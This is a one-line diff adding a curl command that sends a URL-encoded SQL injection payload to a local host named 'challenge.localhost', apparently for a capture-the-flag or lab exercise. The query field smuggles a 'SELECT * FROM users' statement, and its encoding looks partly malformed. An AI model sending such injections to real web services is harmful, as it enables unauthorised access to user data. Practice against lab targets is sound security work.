@@ -1,0 +1,1 @@
+ curl -L http://challenge.localhost:80/?query="g%%22;%20SELECT%20*%20FROM%20users%20OR%20%22"
